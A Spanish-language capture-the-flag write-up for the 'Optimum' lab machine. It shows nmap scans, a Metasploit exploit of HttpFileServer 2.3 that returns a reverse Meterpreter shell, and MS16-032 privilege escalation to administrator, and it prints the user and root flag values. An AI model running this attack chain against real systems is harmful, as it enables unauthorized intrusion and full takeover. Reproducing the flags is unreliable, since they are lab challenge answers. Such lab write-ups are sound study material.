
![[20250721114950.png]](optimum-images/20250721114950.png)

# Fase de reconocimiento


primero vamos a lanzar un escaneo de puertos sencillo con nmap 

```bash
nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.129.180.214 -oG allPorts
```

una vez tenemos los puertos abiertos realizamos un segundo escaneo de nmap. En este caso lanzando scripts básicos para saber el servicio y la versión que corren por detras de cada puerto

```bash
nmap -p80 -sCV 10.129.180.214 -oN targeted
```

![[20250722094155.png]]

Aqui vemos el puerto 80 con servicio http y versión HttpFileServer httpd 2.3

# Metasploit 

abrimos la consola de metasploit

```bash
msfdb run
```

buscamos exploits derivados del servicio HttpFileServer

```bash
search HttpFileServer
```

![[20250722094422.png]]
Os dejo por aqui el exploit
```bash
exploit/windows/http/rejetto_hfs_exec
```

podemos activarlo poniendo 

```bash
use 0
```

ya que es el Id del exploit en la busqueda o

```bash
use exploit/windows/http/rejetto_hfs_exec
```

de esta forma llamamos directamente al exploit

en las opciones que veremos con el comando `options`

debemos cambiar los siguientes parámetros:

- RHOSTS - IP VICTIMA
- LHOST - NUESTRA IP
- LPORT - EL PUERTO QUE RECIBIRA LA SHELL EN NUESTRO EQUIPO 
		-(cambiar este parámetro es opcional pero hay veces que el puerto 4444 esta bloqueado en la ip victima por que es el que usa por defecto metasploit por lo que en ocasiones es recomendable cambiarlo)

>Para cambiar un parámetro usaremos siempre el comando

```bash
set PARAMETRO DATA
```

Por ejemplo:

```bash
set RHOSTS 10.129.180.214
```

una vez hemos cambiado todos los parámetros necesarios lanzamos el exploit

```bash
exploit
```

![[20250722095036.png]]

recibiremos una shell como meterpreter pero como empieza a ser costumbre ya no tendremos acceso a la carpeta administrador ni a muchas partes del sistema por lo que debemos conseguir esa escalada de privilegios

# Escalada de privilegios

lanzaremos este código que hará un escáner de vulnerabilidades interno en la maquina victima

```bash
run post/multi/recon/local_exploit_suggester
```

![[20250722095308.png]]

aqui nos recomendara varios exploits para realizar la escalada

ahora dejaremos la terminal de meterpreter suspendida para reutilizarla con el nuevo exploit

```bash
background
```

en mi caso utilizare el exploit:
> exploit/windows/local/ms16_032_secondary_logon_handle_privesc

```bash
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
```

una vez activo volvemos a poner el comando `options`  para ver que parámetros podemos cambiar, en este caso:

- SESSION - El NUMERO DE SESION DE METERPRETER QUE TENEMOS SUSPENDIDA 
	- podemos ver las sesiones poniendo el comando `sessions` (si habéis seguido los pasos del writeup será la 1) 
- LHOSTS - NUESTRA IP
- LPORT - PUERTO DONDE RECIBIREMOS LA SHELL

y lanzamos el exploit 

```bash
exploit
```

![[20250722095833.png]]

obtenemos la shell como meterpreter y ahora si con total privilegio

# Flags

## user

la flag se encuentra en el directorio: C:\Users\kostas\Desktop

![[20250722095957.png]]

user: 4ba9776b13b088debe39c37a2921a97e

## root

la flag se encuentra en el directorio: C:\Users\Administrator\Desktop

![[20250722100055.png]]

root: 828d9f5bc4d29e410f6425e17a9a2693
